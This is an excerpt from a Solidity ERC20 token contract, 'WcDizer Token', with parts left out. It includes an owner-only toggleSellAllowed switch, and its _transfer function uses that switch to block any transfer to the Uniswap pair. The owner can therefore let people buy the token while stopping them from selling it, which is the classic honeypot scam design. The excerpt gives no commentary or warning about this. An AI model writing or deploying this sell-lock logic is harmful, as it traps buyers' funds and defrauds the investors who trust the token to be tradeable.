...
contract WcDizerToken is IERC20 {
    string public constant name = "WcDizer Token";
    string public constant symbol = "WcDizer";
    ...
    function toggleSellAllowed(bool _status) external onlyOwner {
        sellAllowed = _status;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        require(tradingOpen || sender == owner || recipient == owner, "Trading is not yet enabled.");
        require(sellAllowed || recipient != uniswapPair, "Selling is not allowed");
